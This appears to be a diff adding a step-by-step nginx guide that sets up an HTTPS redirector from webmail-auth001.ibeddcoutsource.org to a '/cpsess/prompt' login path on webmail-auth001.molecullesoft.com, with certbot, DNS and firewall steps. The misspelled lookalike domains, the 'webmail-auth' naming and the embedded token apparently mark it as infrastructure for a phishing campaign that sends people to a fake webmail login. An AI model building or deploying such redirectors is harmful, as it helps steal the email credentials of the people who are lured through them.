@@ -1,0 +1,148 @@
+NGINX REDIRECT SETUP GUIDE
+==========================
+From: webmail-auth001.ibeddcoutsource.org
+To: webmail-auth001.molecullesoft.com
+Encryption Path: /cpsess/prompt?fromPWA=1&pwd=&_x_zm_rtaid=I7SQ3VePRPS/cndRs57BvQ.1709509974548/&_x_zm_rhtaid=
+
+STEP 1: INSTALL NGINX (if not already installed)
+================================================
+sudo apt update
+sudo apt install nginx -y
+
+STEP 2: CHECK NGINX STATUS
+==========================
+sudo systemctl status nginx
+sudo systemctl enable nginx
+sudo systemctl start nginx
+
+STEP 3: CREATE NGINX CONFIGURATION FILE
+======================================
+sudo nano /etc/nginx/sites-available/webmail-auth001.ibeddcoutsource.org
+
+STEP 4: ADD THE FOLLOWING CONFIGURATION TO THE FILE
+==================================================
+server {
+    listen 80;
+    server_name webmail-auth001.ibeddcoutsource.org;
+    
+    # Redirect all HTTP traffic to HTTPS
+    return 301 https://$server_name$request_uri;
+}
+
+server {
+    listen 443 ssl http2;
+    server_name webmail-auth001.ibeddcoutsource.org;
+    
+    # SSL Configuration (you'll need to obtain SSL certificates)
+    ssl_certificate /etc/ssl/certs/webmail-auth001.ibeddcoutsource.org.crt;
+    ssl_certificate_key /etc/ssl/private/webmail-auth001.ibeddcoutsource.org.key;
+    
+    # SSL Security Settings
+    ssl_protocols TLSv1.2 TLSv1.3;
+    ssl_ciphers ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384;
+    ssl_prefer_server_ciphers off;
+    ssl_session_cache shared:SSL:10m;
+    ssl_session_timeout 10m;
+    
+    # Redirect to the target domain with encryption path
+    location / {
+        return 301 https://webmail-auth001.molecullesoft.com/cpsess/prompt?fromPWA=1&pwd=&_x_zm_rtaid=I7SQ3VePRPS/cndRs57BvQ.1709509974548/&_x_zm_rhtaid=;
+    }
+    
+    # Alternative: Redirect only specific path
+    # location /cpsess/prompt {
+    #     return 301 https://webmail-auth001.molecullesoft.com/cpsess/prompt?fromPWA=1&pwd=&_x_zm_rtaid=I7SQ3VePRPS/cndRs57BvQ.1709509974548/&_x_zm_rhtaid=;
+    # }
+}
+
+STEP 5: ENABLE THE SITE
+=======================
+sudo ln -s /etc/nginx/sites-available/webmail-auth001.ibeddcoutsource.org /etc/nginx/sites-enabled/
+
+STEP 6: TEST NGINX CONFIGURATION
+================================
+sudo nginx -t
+
+STEP 7: RELOAD NGINX
+====================
+sudo systemctl reload nginx
+
+STEP 8: OBTAIN SSL CERTIFICATES (USING CERTBOT)
+===============================================
+# Install Certbot
+sudo apt install certbot python3-certbot-nginx -y
+
+# Obtain SSL certificate
+sudo certbot --nginx -d webmail-auth001.ibeddcoutsource.org
+
+# Or manually obtain certificate
+sudo certbot certonly --standalone -d webmail-auth001.ibeddcoutsource.org
+
+STEP 9: UPDATE CONFIGURATION WITH AUTO-GENERATED SSL (if using certbot)
+======================================================================
+# Certbot will automatically update the configuration file
+# If manual, update the SSL certificate paths in the config file
+
+STEP 10: FINAL NGINX RELOAD
+===========================
+sudo systemctl reload nginx
+
+STEP 11: TEST THE REDIRECT
+==========================
+# Test from command line
+curl -I http://webmail-auth001.ibeddcoutsource.org
+curl -I https://webmail-auth001.ibeddcoutsource.org
+
+# Test from browser
+# Navigate to: https://webmail-auth001.ibeddcoutsource.org
+# Should redirect to: https://webmail-auth001.molecullesoft.com/cpsess/prompt?fromPWA=1&pwd=&_x_zm_rtaid=I7SQ3VePRPS/cndRs57BvQ.1709509974548/&_x_zm_rhtaid=
+
+STEP 12: DNS CONFIGURATION
+==========================
+# Add A record in your DNS provider:
+# Name: webmail-auth001.ibeddcoutsource.org
+# Type: A
+# Value: [YOUR_SERVER_IP_ADDRESS]
+
+STEP 13: FIREWALL CONFIGURATION
+===============================
+sudo ufw allow 80/tcp
+sudo ufw allow 443/tcp
+sudo ufw enable
+
+STEP 14: MONITORING AND LOGS
+============================
+# View Nginx access logs
+sudo tail -f /var/log/nginx/access.log
+
+# View Nginx error logs
+sudo tail -f /var/log/nginx/error.log
+
+# Check Nginx status
+sudo systemctl status nginx
+
+TROUBLESHOOTING COMMANDS
+========================
+# Check if port 80 and 443 are listening
+sudo netstat -tlnp | grep :80
+sudo netstat -tlnp | grep :443
+
+# Check Nginx configuration syntax
+sudo nginx -t
+
+# Restart Nginx completely if needed
+sudo systemctl restart nginx
+
+# Check SSL certificate validity
+sudo openssl x509 -in /etc/letsencrypt/live/webmail-auth001.ibeddcoutsource.org/fullchain.pem -text -noout
+
+# Test SSL connection
+openssl s_client -connect webmail-auth001.ibeddcoutsource.org:443 -servername webmail-auth001.ibeddcoutsource.org
+
+NOTES:
+======
+- Replace [YOUR_SERVER_IP_ADDRESS] with your actual server IP
+- Ensure DNS propagation is complete (can take up to 48 hours)
+- Keep SSL certificates updated (certbot can auto-renew)
+- Monitor logs for any issues
+- Consider setting up monitoring for the redirect functionality
